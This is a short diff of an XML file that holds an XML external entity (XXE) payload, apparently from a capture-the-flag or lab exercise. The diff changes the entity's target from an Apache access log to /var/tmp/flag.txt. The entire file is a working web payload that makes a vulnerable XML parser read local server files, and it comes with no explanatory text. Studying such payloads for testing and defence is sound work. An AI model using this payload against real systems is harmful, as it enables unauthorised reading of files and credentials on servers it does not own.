@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE data [
-    <!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">
+    <!ENTITY xxe SYSTEM "file:///var/tmp/flag.txt">
 ]>
 <data>
     &xxe;
